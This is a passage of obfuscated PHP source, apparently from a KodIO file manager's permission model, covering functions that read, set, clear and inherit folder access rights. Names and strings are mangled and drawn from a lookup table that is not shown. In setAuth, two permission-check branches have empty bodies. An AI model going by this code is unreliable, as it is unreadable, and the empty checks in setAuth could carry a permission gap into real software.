$this->removeByFile($ä‡Šîº[$ÂäéêÀ—[565]]); } return $ÁìëØØÀ; } private function removeByFile($Íù„‚¶‚) { $°æøªãÖ =& $_SERVER[‘ÆÜ‘œ]; $äËàç ­ = Model($°æøªãÖ[939])->where(array($°æøªãÖ[565] => $Íù„‚¶‚))->field($°æøªãÖ[192])->select(); $Ğµ©¾¢Ø = array_to_keyvalue($äËàç ­, $°æøªãÖ[12], $°æøªãÖ[192]); $í¬ğĞÏæ = array($°æøªãÖ[192] => array($°æøªãÖ[7], $Ğµ©¾¢Ø), $°æøªãÖ[586] => 1); $äËàç ­ = $this->where($í¬ğĞÏæ)->field($°æøªãÖ[695])->select(); if (empty($äËàç ­)) { return; } $ËµÙâ­ = array_to_keyvalue($äËàç ­, $°æøªãÖ[12], $°æøªãÖ[695]); $this->remove($ËµÙâ­); } private function shareFileMeta($´§¡ÍÅ‚, $ó»÷áÖğ = null) { $Ö„µ°½ó =& $_SERVER[‘ÆÜ‘œ]; $İÄ³é®ö = array($Ö„µ°½ó[565] => $´§¡ÍÅ‚, $Ö„µ°½ó[95] => $Ö„µ°½ó[2317]); if (is_null($ó»÷áÖğ)) { return Model($Ö„µ°½ó[2318])->where($İÄ³é®ö)->find(); } $İÄ³é®ö[$Ö„µ°½ó[460]] = $ó»÷áÖğ; Model($Ö„µ°½ó[2318])->add($İÄ³é®ö, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\143\145\x5f\x61\165\164\x68"; public function getAuth($ÏË¼ºŒ­) { $†«“Î¡ =& $_SERVER[‘ÆÜ‘œ]; $š¬ïèÀ¦ = $this->sourceAuthSelect($ÏË¼ºŒ­); $¦í«¡±Ì = array(); $à˜ÜãûÉ = array(); $¨òªìÒ = 2 << 25; foreach ($š¬ïèÀ¦ as $Ñ˜Ì„©) { $Ô·İ‰˜Ã = Model($†«“Î¡[599])->listData($Ñ˜Ì„©[$†«“Î¡[1591]]); if (!$Ô·İ‰˜Ã) { continue; } $¦í«¡±Ì[] = $Ñ˜Ì„©; $áÊ’ •Û = 0; if ($Ñ˜Ì„©[$†«“Î¡[189]] == SourceModel::TYPE_GROUP) { $áÊ’ •Û = $¨òªìÒ * 2; } if ($Ñ˜Ì„©[$†«“Î¡[189]] == SourceModel::TYPE_USER) { $áÊ’ •Û = $¨òªìÒ; } if ($Ñ˜Ì„©[$†«“Î¡[189]] == SourceModel::TYPE_USER && $Ñ˜Ì„©[$†«“Î¡[597]] == $†«“Î¡[229]) { $áÊ’ •Û = 0; } $à˜ÜãûÉ[] = $Ô·İ‰˜Ã[$†«“Î¡[510]] + $áÊ’ •Û; } array_multisort($à˜ÜãûÉ, SORT_DESC, $¦í«¡±Ì); return $¦í«¡±Ì; } public function sourceAuthSelect($ôûÅë–) { $á‡ÉıÂñ =& $_SERVER[‘ÆÜ‘œ]; static $§âñ¼ğø = array(); $§è¡Ò²Æ = is_array($ôûÅë–) ? !1 : !0; if ($§è¡Ò²Æ) { $ôûÅë– = array($ôûÅë–); } $È­ùßÄµ = array(); foreach ($ôûÅë– as $âÔŸœ§) { if (isset($§âñ¼ğø[$âÔŸœ§])) { $È­ùßÄµ[$âÔŸœ§] = $§âñ¼ğø[$âÔŸœ§]; } } if (count($È­ùßÄµ) == count($ôûÅë–)) { return $§è¡Ò²Æ ? $È­ùßÄµ[$ôûÅë–[0]] : $È­ùßÄµ; } $¹¼ßò°× = $á‡ÉıÂñ[2319]; $…£²ä–ø = array($á‡ÉıÂñ[192] => array($á‡ÉıÂñ[7], $ôûÅë–)); $ƒêæ·†Å = $this->field($¹¼ßò°×)->order($á‡ÉıÂñ[495])->where($…£²ä–ø)->select(); $Ğø¹Šô£ = array_to_keyvalue_group($ƒêæ·†Å, $á‡ÉıÂñ[192]); foreach ($ôûÅë– as $âÔŸœ§) { $§âñ¼ğø[$âÔŸœ§] = $Ğø¹Šô£[$âÔŸœ§] ? $Ğø¹Šô£[$âÔŸœ§] : array(); } if ($§è¡Ò²Æ) { return $ƒêæ·†Å; } return $Ğø¹Šô£; } public function setAuth($¦—ÍÍëù, $Œ˜åÎÁŸ) { $–¨üùÒ® =& $_SERVER[‘ÆÜ‘œ]; $¶ï–Öü = Model($–¨üùÒ®[1484])->sourceInfo($¦—ÍÍëù); if (!$¶ï–Öü) { return !1; } if ($¶ï–Öü[$–¨üùÒ®[189]] != SourceModel::TYPE_GROUP) { return !1; } $×õØõØ× = 1; $ªİ£†Ï = $¶ï–Öü[$–¨üùÒ®[597]]; if ($ªİ£†Ï != $×õØõØ×) { $–Ì¥Çî = array($–¨üùÒ®[1446] => $ªİ£†Ï); $ªÇ…äá = Model($–¨üùÒ®[2228])->field($–¨üùÒ®[1544])->where($–Ì¥Çî)->select(); $ªÇ…äá = array_to_keyvalue($ªÇ…äá, $–¨üùÒ®[12], $–¨üùÒ®[1544]); } $”‰Ö‰­œ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $àÇÕâ²ú = array(); foreach ($Œ˜åÎÁŸ as $Šã³üê½) { if (!in_array($Šã³üê½[$–¨üùÒ®[189]], $”‰Ö‰­œ)) { show_json(LNG($–¨üùÒ®[2320]), !1); } if ($ªİ£†Ï != $×õØõØ×) { if ($Šã³üê½[$–¨üùÒ®[189]] == SourceModel::TYPE_GROUP) { } if ($Šã³üê½[$–¨üùÒ®[597]] != 0 && !in_array($Šã³üê½[$–¨üùÒ®[597]], $ªÇ…äá)) { } } if ($Šã³üê½[$–¨üùÒ®[597]] == 0) { $Šã³üê½[$–¨üùÒ®[189]] = SourceModel::TYPE_USER; } $àÇÕâ²ú[] = array($–¨üùÒ®[192] => $¦—ÍÍëù, $–¨üùÒ®[189] => intval($Šã³üê½[$–¨üùÒ®[189]]), $–¨üùÒ®[597] => intval($Šã³üê½[$–¨üùÒ®[597]]), $–¨üùÒ®[1591] => intval($Šã³üê½[$–¨üùÒ®[1591]]) ? intval($Šã³üê½[$–¨üùÒ®[1591]]) : 0, $–¨üùÒ®[2298] => intval($Šã³üê½[$–¨üùÒ®[2298]]) ? intval($Šã³üê½[$–¨üùÒ®[2298]]) : -1); } $this->where(array($–¨üùÒ®[514] => $¦—ÍÍëù))->delete(); $this->addAll($àÇÕâ²ú); return !0; } public function authClear($¦µá€¸ï) { $õı¨²äÖ =& $_SERVER[‘ÆÜ‘œ]; $ŠÍÜ»Š = Model($õı¨²äÖ[1484])->sourceInfo($¦µá€¸ï); $ìí±‘Î… = array($¦µá€¸ï); if ($ŠÍÜ»Š[$õı¨²äÖ[508]] == $õı¨²äÖ[91]) { $÷‚Ô–ÌÀ = array($õı¨²äÖ[682] => array($õı¨²äÖ[643], $ŠÍÜ»Š[$õı¨²äÖ[612]] . $¦µá€¸ï . $õı¨²äÖ[644])); $ìí±‘Î… = Model($õı¨²äÖ[1484])->field($õı¨²äÖ[514])->where($÷‚Ô–ÌÀ)->getField($õı¨²äÖ[192], !0); $ìí±‘Î…[] = $¦µá€¸ï; } $this->where(array($õı¨²äÖ[514] => array($õı¨²äÖ[515], $ìí±‘Î…)))->delete(); return !0; } public function getAllParent($éù“±×¨) { $×Ë¡¯èû =& $_SERVER[‘ÆÜ‘œ]; $ç¹¨Œóõ = Model($×Ë¡¯èû[1484])->sourceInfo($éù“±×¨); if (!$ç¹¨Œóõ || $ç¹¨Œóõ[$×Ë¡¯èû[189]] != SourceModel::TYPE_GROUP) { return array(); } $ûÅôŠ”  = Model($×Ë¡¯èû[1484])->parentLevelArray($ç¹¨Œóõ[$×Ë¡¯èû[612]]); $ğ¯‰°É• = array_merge(array(intval($éù“±×¨)), array_reverse($ûÅôŠ” )); $ïï¿î² = $this->sourceAuthSelect($ğ¯‰°É•); $Œ®«©´ï = $GLOBALS[$×Ë¡¯èû[6]][$×Ë¡¯èû[92]][$×Ë¡¯èû[2241]] == 1; $”×—š©ç = $Œ®«©´ï ? 3 : 2; $²ôßè“î = Model($×Ë¡¯èû[1444])->getInfo($ç¹¨Œóõ[$×Ë¡¯èû[597]]); $Îƒñ¤†« = explode($×Ë¡¯èû[50], trim($²ôßè“î[$×Ë¡¯èû[612]], $×Ë¡¯èû[50])); $ñÍ¶²­‰ = array_merge(array($²ôßè“î[$×Ë¡¯èû[1446]]), array_reverse(array_slice($Îƒñ¤†«, $”×—š©ç))); foreach ($ïï¿î² as $éù“±×¨ => $ÏË±õªë) { foreach ($ÏË±õªë as $ß¶‚¡–¡) { if (!$ß¶‚¡–¡ || !$ß¶‚¡–¡[$×Ë¡¯èû[597]] || $ß¶‚¡–¡[$×Ë¡¯èû[597]] == $×Ë¡¯èû[229]) { continue; } if ($ß¶‚¡–¡[$×Ë¡¯èû[189]] != SourceModel::TYPE_GROUP) { continue; } $ñÍ¶²­‰[] = $ß¶‚¡–¡[$×Ë¡¯èû[597]]; } } $ñÍ¶²­‰ = array_unique($ñÍ¶²­‰); $ª™ˆŒ¼ï = array($×Ë¡¯èû[438] => _get($GLOBALS[$×Ë¡¯èû[7]], $×Ë¡¯èû[438], 1), $×Ë¡¯èû[449] => _get($GLOBALS[$×Ë¡¯èû[7]], $×Ë¡¯èû[449], 500)); $GLOBALS[$×Ë¡¯èû[7]][$×Ë¡¯èû[438]] = 1; $GLOBALS[$×Ë¡¯èû[7]][$×Ë¡¯èû[449]] = 500; $ëÉ«§—ö = array($×Ë¡¯èû[516] => 0, $×Ë¡¯èû[2142] => AuthModel::authAll(), $×Ë¡¯èû[517] => LNG($×Ë¡¯èû[2321]), $×Ë¡¯èû[2157] => $×Ë¡¯èû[2322]); $¬Óèæş = array(); $ÜÀ©å’ = explode($×Ë¡¯èû[50], $×Ë¡¯èû[2323]); $³ıÄ¢çÅ = explode($×Ë¡¯èû[50], $×Ë¡¯èû[2324]); foreach ($ñÍ¶²­‰ as $Û–œ¾Ë¨) { $ÊÖ“å§’ = Model($×Ë¡¯èû[1444])->getInfo($Û–œ¾Ë¨); $•‡–Ï£§ = array_field_key($ÊÖ“å§’, $ÜÀ©å’); $¢¨Ï•á– = Model($×Ë¡¯èû[625])->listByGroup($Û–œ¾Ë¨); foreach ($¢¨Ï•á–[$×Ë¡¯èû[455]] as $±Šö => $®ÀŒêŸ) { $this->userGroupList($®ÀŒêŸ[$×Ë¡¯èû[1544]], $®ÀŒêŸ); $ñÇàˆ•² = $®ÀŒêŸ[$×Ë¡¯èû[1544]] . $×Ë¡¯èû[12]; if (isset($¬Óèæş[$ñÇàˆ•²])) { continue; } $¥úØÈ¾õ = Model($×Ë¡¯èû[2325])->listData($®ÀŒêŸ[$×Ë¡¯èû[2326]]); $®ÀŒêŸ[$×Ë¡¯èû[2327]] = Action($×Ë¡¯èû[2328])->parseUrl($®ÀŒêŸ[$×Ë¡¯èû[2327]]); $®ÀŒêŸ[$×Ë¡¯èû[1895]] = $¥úØÈ¾õ && $¥úØÈ¾õ[$×Ë¡¯èû[2329]] == 1; $˜îÈ†ÖÌ = $this->groupRootAuth($Û–œ¾Ë¨, $®ÀŒêŸ[$×Ë¡¯èû[1544]]); $˜îÈ†ÖÌ = $®ÀŒêŸ[$×Ë¡¯èû[1895]] ? $ëÉ«§—ö : $˜îÈ†ÖÌ; $¬Óèæş[$ñÇàˆ•²] = array($×Ë¡¯èû[2330] => $×Ë¡¯èû[2331], $×Ë¡¯èû[2332] => LNG($×Ë¡¯èû[2333]), $×Ë¡¯èû[2310] => array_field_key($®ÀŒêŸ, $³ıÄ¢çÅ), $×Ë¡¯èû[510] => $˜îÈ†ÖÌ, $×Ë¡¯èû[511] => $˜îÈ†ÖÌ[$×Ë¡¯èû[510]], $×Ë¡¯èû[2334] => $•‡–Ï£§); } } $GLOBALS[$×Ë¡¯èû[7]][$×Ë¡¯èû[438]] = $ª™ˆŒ¼ï[$×Ë¡¯èû[438]]; $GLOBALS[$×Ë¡¯èû[7]][$×Ë¡¯èû[449]] = $ª™ˆŒ¼ï[$×Ë¡¯èû[449]]; foreach ($ïï¿î² as $éù“±×¨ => $ÏË±õªë) { if (!$ÏË±õªë) { continue; } foreach ($ÏË±õªë as $ß¶‚¡–¡) { if (!$ß¶‚¡–¡ || !$ß¶‚¡–¡[$×Ë¡¯èû[597]] || $ß¶‚¡–¡[$×Ë¡¯èû[597]] == $×Ë¡¯èû[229]) { continue; } if ($ß¶‚¡–¡[$×Ë¡¯èû[189]] != SourceModel::TYPE_USER) { continue; } $ñÇàˆ•² = $ß¶‚¡–¡[$×Ë¡¯èû[597]] . $×Ë¡¯èû[12]; if (isset($¬Óèæş[$ñÇàˆ•²])) { continue; } $¥…—Ş¼ = $this->authMake($ÏË±õªë, $ñÇàˆ•²); if (!$¥…—Ş¼ || !$¥…—Ş¼[$×Ë¡¯èû[2332]]) { continue; } $¬Óèæş[$ñÇàˆ•²] = array($×Ë¡¯èû[2330] => $×Ë¡¯èû[2335], $×Ë¡¯èû[2332] => $¥…—Ş¼[$×Ë¡¯èû[2332]], $×Ë¡¯èû[2310] => Model($×Ë¡¯èû[625])->getInfoSimpleOuter($ñÇàˆ•²), $×Ë¡¯èû[510] => $¥…—Ş¼[$×Ë¡¯èû[564]], $×Ë¡¯èû[511] => $¥…—Ş¼[$×Ë¡¯èû[564]][$×Ë¡¯èû[510]], $×Ë¡¯èû[2334] => $¥…—Ş¼[$×Ë¡¯èû[2336]]); } } foreach ($ïï¿î² as $éù“±×¨ => $ÏË±õªë) { if (!$ÏË±õªë) { continue; } foreach ($¬Óèæş as $ñÇàˆ•² => $üŠ­”Äà) { if ($üŠ­”Äà[$×Ë¡¯èû[2310]][$×Ë¡¯èû[1895]] || $üŠ­”Äà[$×Ë¡¯èû[2330]] == $×Ë¡¯èû[2335]) { continue; } $¥…—Ş¼ = $this->authMake($ÏË±õªë, $ñÇàˆ•²); if (!$¥…—Ş¼ || !$¥…—Ş¼[$×Ë¡¯èû[2332]]) { continue; } $¬Óèæş[$ñÇàˆ•²] = array($×Ë¡¯èû[2330] => $×Ë¡¯èû[2335], $×Ë¡¯èû[2332] => $¥…—Ş¼[$×Ë¡¯èû[2332]], $×Ë¡¯èû[2310] => $üŠ­”Äà[$×Ë¡¯èû[2310]], $×Ë¡¯èû[510] => $¥…—Ş¼[$×Ë¡¯èû[564]], $×Ë¡¯èû[511] => $¥…—Ş¼[$×Ë¡¯èû[564]][$×Ë¡¯èû[510]], $×Ë¡¯èû[2334] => $¥…—Ş¼[$×Ë¡¯èû[2336]]); } } $¬Óèæş = array_sort_by($¬Óèæş, $×Ë¡¯èû[511], $×Ë¡¯èû[548]); return $¬Óèæş; } public function getAllChildren($Äøù«®ï) { $èóÄ ìà =& $_SERVER[‘ÆÜ‘œ]; $ë€¡¤Ğß = Model($èóÄ ìà[1484])->sourceInfo($Äøù«®ï); if ($ë€¡¤Ğß[$èóÄ ìà[508]] != $èóÄ ìà[91]) { return $this->sourceListAuth(array($Äøù«®ï)); } if ($ë€¡¤Ğß[$èóÄ ìà[189]] != SourceModel::TYPE_GROUP) { return array(); } $¼û‚Ú› = 1; $èëòºÅ§ = array($Äøù«®ï); if ($ë€¡¤Ğß[$èóÄ ìà[191]] == $èóÄ ìà[229] && $ë€¡¤Ğß[$èóÄ ìà[597]] != $¼û‚Ú›) { $èëòºÅ§ = $this->groupChidldAllRootSource($ë€¡¤Ğß[$èóÄ ìà[597]]); } $ü‰ÒÚË = $this->field($èóÄ ìà[192])->group($èóÄ ìà[192])->select(); $ü‰ÒÚË = array_to_keyvalue($ü‰ÒÚË, $èóÄ ìà[12], $èóÄ ìà[192]); if (!$ü‰ÒÚË) { return array(); } $üÈÂÉ¤ = $èóÄ ìà[2337]; $ıÕôø‰õ = array($èóÄ ìà[192] => array($èóÄ ìà[7], $ü‰ÒÚË), $èóÄ ìà[528] => $èóÄ ìà[229]); $Ëì³‘Åš = Model($èóÄ ìà[939])->field($üÈÂÉ¤)->where($ıÕôø‰õ)->select(); $–½Ñâƒï = array($Äøù«®ï); foreach ($Ëì³‘Åš as $ñ£âùº‹) { foreach ($èëòºÅ§ as $ˆí¢ëÖÀ) { $½¶ñÎÑ = $èóÄ ìà[50] . $ˆí¢ëÖÀ . $èóÄ ìà[50]; $´Ù…æ“ = $ñ£âùº‹[$èóÄ ìà[612]] . $ñ£âùº‹[$èóÄ ìà[192]] . $èóÄ ìà[50]; if (strstr($´Ù…æ“, $½¶ñÎÑ)) { $–½Ñâƒï[] = $ñ£âùº‹[$èóÄ ìà[192]]; break; } } } return $this->sourceListAuth($–½Ñâƒï); } private function sourceListAuth($°µ“à²†) { $º¤ÕÒäë =& $_SERVER[‘ÆÜ‘œ]; $·á²»« = Model($º¤ÕÒäë[1484])->sourceListInfo($°µ“à²†, !0); $›‰‘°û§ = $this->sourceAuthSelect($°µ“à²†); $úÌ±º¶Å = array(); $®Â­Æ = array(); foreach ($·á²»« as $×ğÂŞ¯·) { unset($×ğÂŞ¯·[$º¤ÕÒäë[551]]); unset($×ğÂŞ¯·[$º¤ÕÒäë[549]]); unset($×ğÂŞ¯·[$º¤ÕÒäë[510]]); unset($×ğÂŞ¯·[$º¤ÕÒäë[90]]); $ÙŒ©– = $›‰‘°û§[$×ğÂŞ¯·[$º¤ÕÒäë[192]]]; if (!$ÙŒ©–) { continue; } $×ğÂŞ¯·[$º¤ÕÒäë[2334]] = $this->authTargetInfo($ÙŒ©–); $×ğÂŞ¯·[$º¤ÕÒäë[610]] = rtrim($×ğÂŞ¯·[$º¤ÕÒäë[616]], $º¤ÕÒäë[8]) . $º¤ÕÒäë[8] . ltrim($×ğÂŞ¯·[$º¤ÕÒäë[610]], $º¤ÕÒäë[8]); $úÌ±º¶Å[] = $×ğÂŞ¯·; $¶ıûÀ‘ = count(explode($º¤ÕÒäë[8], trim($×ğÂŞ¯·[$º¤ÕÒäë[610]], $º¤ÕÒäë[8]))); $®Â­Æ[] = $¶ıûÀ‘ + ($×ğÂŞ¯·[$º¤ÕÒäë[33]] == $º¤ÕÒäë[78] ? 0 : 1000); } array_multisort($®Â­Æ, SORT_ASC, $úÌ±º¶Å); return $úÌ±º¶Å; } private function groupChidldAllRootSource($½ÖÁÃ¹) { $’Çº–£Ü =& $_SERVER[‘ÆÜ‘œ]; $óêİüãğ = Model($’Çº–£Ü[1444])->groupChildrenAll($½ÖÁÃ¹); $à øÈî = array($’Çº–£Ü[191] => 0, $’Çº–£Ü[597] => array($’Çº–£Ü[7], $óêİüãğ), $’Çº–£Ü[189] => SourceModel::TYPE_GROUP); $Ñ²Êüù = Model($’Çº–£Ü[939])->field($’Çº–£Ü[192])->where($à øÈî)->select(); $Ñ²Êüù = array_to_keyvalue($Ñ²Êüù, $’Çº–£Ü[12], $’Çº–£Ü[192]); return $Ñ²Êüù; } private function authTargetInfo($öƒœ¬ğ) { $ÏæÉä½§ =& $_SERVER[‘ÆÜ‘œ]; $°Ê’¼ˆ = array(); $¿«—Œš = array(); $ëøÄÒå½ = 2 << 25; foreach ($öƒœ¬ğ as $á‘”¸Œ) { $ÅŠåŸÒß = Model($ÏæÉä½§[599])->listData($á‘”¸Œ[$ÏæÉä½§[1591]]); if (!$ÅŠåŸÒß) { continue; } if ($á‘”¸Œ[$ÏæÉä½§[189]] == SourceModel::TYPE_USER) { $ÆüÖ­ºŞ = Model($ÏæÉä½§[605])->getInfoSimpleOuter($á‘”¸Œ[$ÏæÉä½§[597]]); if ($ÆüÖ­ºŞ[$ÏæÉä½§[1544]] == $ÏæÉä½§[1328]) { continue; } if ($ÆüÖ­ºŞ[$ÏæÉä½§[1544]] == $ÏæÉä½§[229]) { $ÆüÖ­ºŞ[$ÏæÉä½§[32]] = LNG($ÏæÉä½§[2338]); } } else { $ÆüÖ­ºŞ = Model($ÏæÉä½§[613])->getInfoSimple($á‘”¸Œ[$ÏæÉä½§[597]]); } if (!$ÆüÖ­ºŞ) { continue; } $ÆüÖ­ºŞ[$ÏæÉä½§[564]] = $ÅŠåŸÒß; $°Ê’¼ˆ[] = $ÆüÖ­ºŞ; $›µ«¦§ = 0; if ($á‘”¸Œ[$ÏæÉä½§[189]] == SourceModel::TYPE_GROUP) { $›µ«¦§ = $ëøÄÒå½ * 2; } if ($á‘”¸Œ[$ÏæÉä½§[189]] == SourceModel::TYPE_USER) { $›µ«¦§ = $ëøÄÒå½; } if ($á‘”¸Œ[$ÏæÉä½§[189]] == SourceModel::TYPE_USER && $á‘”¸Œ[$ÏæÉä½§[597]] == $ÏæÉä½§[229]) { $›µ«¦§ = 0; } $¿«—Œš[] = $ÅŠåŸÒß[$ÏæÉä½§[510]] + $›µ«¦§; } array_multisort($¿«—Œš, SORT_DESC, $°Ê’¼ˆ); return $°Ê’¼ˆ; } public function getAllChildrenByUser($ùıµÏÕ, $ÊÓ´×ê) { $¶¡ê­Õ• =& $_SERVER[‘ÆÜ‘œ]; $à¤ÚÕê = Model($¶¡ê­Õ•[625])->getInfo($ÊÓ´×ê); if (!$ÊÓ´×ê || !$ùıµÏÕ || !$à¤ÚÕê) { return array(); } $İ¬‰ìÃı = Model($¶¡ê­Õ•[1484])->sourceInfo($ùıµÏÕ); $¯ÊŠ¶›… = array(); $¸œ¯ø²ß = 1; if ($İ¬‰ìÃı[$¶¡ê­Õ•[191]] == $¶¡ê­Õ•[229] && $İ¬‰ìÃı[$¶¡ê­Õ•[597]] != $¸œ¯ø²ß && $this->groupContainUser($İ¬‰ìÃı[$¶¡ê­Õ•[597]], $ÊÓ´×ê)) { foreach ($à¤ÚÕê[$¶¡ê­Õ•[1445]] as $… ¯°¾) { $Ÿñª“†ü = Model($¶¡ê­Õ•[613])->getInfo($… ¯°¾[$¶¡ê­Õ•[1446]]); $øÛ ¬şş = Model($¶¡ê­Õ•[625])->getInfoSimpleOuter($ÊÓ´×ê); $øÛ ¬şş[$¶¡ê­Õ•[564]] = $… ¯°¾[$¶¡ê­Õ•[510]]; if (Model($¶¡ê­Õ•[599])->authCheckAction($… ¯°¾[$¶¡ê­Õ•[510]][$¶¡ê­Õ•[510]], $¶¡ê­Õ•[1516])) { continue; } $ğÖÕ¦ğ£ = array($¶¡ê­Õ•[32] => $¶¡ê­Õ•[1347] . $Ÿñª“†ü[$¶¡ê­Õ•[32]], $¶¡ê­Õ•[192] => $Ÿñª“†ü[$¶¡ê­Õ•[90]][$¶¡ê­Õ•[192]], $¶¡ê­Õ•[87] => KodIO::make($Ÿñª“†ü[$¶¡ê­Õ•[90]][$¶¡ê­Õ•[192]]), $¶¡ê­Õ•[191] => $¶¡ê­Õ•[229], $¶¡ê­Õ•[189] => $¶¡ê­Õ•[606], $¶¡ê­Õ•[33] => $¶¡ê­Õ•[647], $¶¡ê­Õ•[610] => $Ÿñª“†ü[$¶¡ê­Õ•[617]], $¶¡ê­Õ•[1446] => $Ÿñª“†ü[$¶¡ê­Õ•[1446]], $¶¡ê­Õ•[614] => $Ÿñª“†ü[$¶¡ê­Õ•[191]], $¶¡ê­Õ•[2334] => array($øÛ ¬şş)); $¯ÊŠ¶›…[$ğÖÕ¦ğ£[$¶¡ê­Õ•[192]]] = $ğÖÕ¦ğ£; } } $ä«ÚÚÈÃ = array(); $Ûëìº¹Ï = $this->getAllChildren($ùıµÏÕ); foreach ($Ûëìº¹Ï as $“ÍÖ¢¢) { $½Áóƒüû = !1; foreach ($“ÍÖ¢¢[$¶¡ê­Õ•[2334]] as $³Ğ×Ôª) { if ($³Ğ×Ôª[$¶¡ê­Õ•[1544]]) { if ($³Ğ×Ôª[$¶¡ê­Õ•[1544]] == $ÊÓ´×ê) { $½Áóƒüû = !0; break; } } if ($³Ğ×Ôª[$¶¡ê­Õ•[1446]]) { if ($this->groupContainUser($³Ğ×Ôª[$¶¡ê­Õ•[1446]], $ÊÓ´×ê)) { $½Áóƒüû = !0; break; } } } if ($½Áóƒüû) { $ä«ÚÚÈÃ[] = $“ÍÖ¢¢; } $¾—ı¥³¡ = $“ÍÖ¢¢[$¶¡ê­Õ•[192]]; if (isset($¯ÊŠ¶›…[$¾—ı¥³¡])) { $“ÍÖ¢¢[$¶¡ê­Õ•[2334]][] = $¯ÊŠ¶›…[$¾—ı¥³¡][0]; $¯ÊŠ¶›…[$¾—ı¥³¡] = !1; } } $¯ÊŠ¶›… = array_filter(array_values($¯ÊŠ¶›…)); $ä«ÚÚÈÃ = array_merge($¯ÊŠ¶›…, $ä«ÚÚÈÃ); return $ä«ÚÚÈÃ; } public function setAllChildrenByUser($Öï±ÀÉ¡, $æ»êâĞù, $¤±‹’±) { $ÎŸ§™•É =& $_SERVER[‘ÆÜ‘œ]; $±¢“õ˜× = $this->getAllChildrenByUser($Öï±ÀÉ¡, $æ»êâĞù); if (!$¤±‹’± || !$±¢“õ˜×) { return !1; } foreach ($±¢“õ˜× as $µıâ€ğı) { $¡ºë¼ã = array(); foreach ($µıâ€ğı[$ÎŸ§™•É[2334]] as $˜ßòÄã) { $­Êçøê = $˜ßòÄã[$ÎŸ§™•É[564]]; $€ã¥•Û = $˜ßòÄã[$ÎŸ§™•É[1544]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ä¸„£â× = $˜ßòÄã[$ÎŸ§™•É[1544]] ? $˜ßòÄã[$ÎŸ§™•É[1544]] : $˜ßòÄã[$ÎŸ§™•É[1446]]; if ($˜ßòÄã[$ÎŸ§™•É[1544]] && $˜ßòÄã[$ÎŸ§™•É[1544]] == $æ»êâĞù) { continue; } $¡ºë¼ã[] = array($ÎŸ§™•É[192] => $µıâ€ğı[$ÎŸ§™•É[192]], $ÎŸ§™•É[189] => $€ã¥•Û, $ÎŸ§™•É[597] => intval($ä¸„£â×), $ÎŸ§™•É[1591] => isset($­Êçøê[$ÎŸ§™•É[495]]) ? intval($­Êçøê[$ÎŸ§™•É[495]]) : 0, $ÎŸ§™•É[2298] => isset($­Êçøê[$ÎŸ§™•É[2298]]) ? intval($­Êçøê[$ÎŸ§™•É[2298]]) : -1); } $¡ºë¼ã[] = array($ÎŸ§™•É[192] => $µıâ€ğı[$ÎŸ§™•É[192]], $ÎŸ§™•É[189] => SourceModel::TYPE_USER, $ÎŸ§™•É[597] => intval($æ»êâĞù), $ÎŸ§™•É[1591] => intval($¤±‹’±), $ÎŸ§™•É[2298] => -1); $this->where(array($ÎŸ§™•É[514] => $µıâ€ğı[$ÎŸ§™•É[192]]))->delete(); $this->addAll($¡ºë¼ã); } return !0; } public function get($šÒ‘•) { $¨¥Ö›‚å = $this->getSourceList(array($šÒ‘•), !0); return $¨¥Ö›‚å[0]; } public function getSourceList($ÌŞšü±Ç, $”ÍÌÂ‚Ì = false, $‡­Üè¨› = false) { $›ò«Î”ó =& $_SERVER[‘ÆÜ‘œ]; if (!$ÌŞšü±Ç) { return array(); } $ääÑ‹ê = Model($›ò«Î”ó[1484]); if (!$”ÍÌÂ‚Ì && count($ÌŞšü±Ç) == 1) { $”ÍÌÂ‚Ì = array(); $”ÍÌÂ‚Ì[$ÌŞšü±Ç[0]] = $ääÑ‹ê->sourceInfo($ÌŞšü±Ç[0]); } if (!$”ÍÌÂ‚Ì) { $µÓ©Ÿ˜¾ = array($›ò«Î”ó[514] => array($›ò«Î”ó[515], $ÌŞšü±Ç)); $”ÍÌÂ‚Ì = $ääÑ‹ê->field($›ò«Î”ó[2339])->where($µÓ©Ÿ˜¾)->select(); $”ÍÌÂ‚Ì = array_to_keyvalue($”ÍÌÂ‚Ì, $›ò«Î”ó[192]); } $¯–Ìäì› = $ÌŞšü±Ç; foreach ($”ÍÌÂ‚Ì as $Õİä => $ÃÎ»Á•¾) { $É ÇşÏê = $ääÑ‹ê->parentLevelArray($ÃÎ»Á•¾[$›ò«Î”ó[612]]); $¯–Ìäì› = array_merge($¯–Ìäì›, array(intval($Õİä)), array_reverse($É ÇşÏê)); } $¯–Ìäì› = array_values(array_unique($¯–Ìäì›)); if (!$¯–Ìäì›) { return array(); } $’ÂàåËÏ = $this->sourceAuthSelect($¯–Ìäì›); $ËÚ¯şçŞ = array(); foreach ($¯–Ìäì› as $‡š…÷É”) { if (isset($’ÂàåËÏ[$‡š…÷É”])) { $ËÚ¯şçŞ[$‡š…÷É”] = $’ÂàåËÏ[$‡š…÷É”]; } } $¥ãïûªğ = $this->userIsRoot($‡­Üè¨›); $å–”í—° = AuthModel::authAll(); $áĞ¨öŒ„ = array($›ò«Î”ó[511] => $å–”í—°, $›ò«Î”ó[2340] => array($›ò«Î”ó[516] => 0, $›ò«Î”ó[2142] => $å–”í—°, $›ò«Î”ó[517] => LNG($›ò«Î”ó[2321]), $›ò«Î”ó[2157] => $›ò«Î”ó[2322])); $ßİÌ©ëæ = array(); foreach ($”ÍÌÂ‚Ì as $‡š…÷É” => $š÷¬šä) { if ($¥ãïûªğ && $GLOBALS[$›ò«Î”ó[6]][$›ò«Î”ó[2155]]) { $ßİÌ©ëæ[$‡š…÷É”] = $áĞ¨öŒ„; continue; } $ßİÌ©ëæ[$‡š…÷É”] = $this->makeSourceAuth($š÷¬šä, $ËÚ¯şçŞ, $‡­Üè¨›); } return $ßİÌ©ëæ; } public function authDeepCheck($ç¬ÍŒí©, $íùš¸á = false) { $®éÎ¡ğ =& $_SERVER[‘ÆÜ‘œ]; $íùš¸á = $íùš¸á ? $íùš¸á : USER_ID; $ò›­™óê = $this->makeAuthDeep($íùš¸á); if (!in_array($ç¬ÍŒí©, $ò›­™óê[$®éÎ¡ğ[2341]])) { return !1; } $•¼Óºø´ = array(); foreach ($ò›­™óê[$®éÎ¡ğ[2342]] as $ˆ›Ş—×Ÿ => $ê÷š’) { if (!in_array($ç¬ÍŒí©, $ê÷š’)) { continue; } $•¼Óºø´[] = $ˆ›Ş—×Ÿ; } if (!$•¼Óºø´) { return !1; } $»Òı†¤Û = $•¼Óºø´ ? $•¼Óºø´[0] : 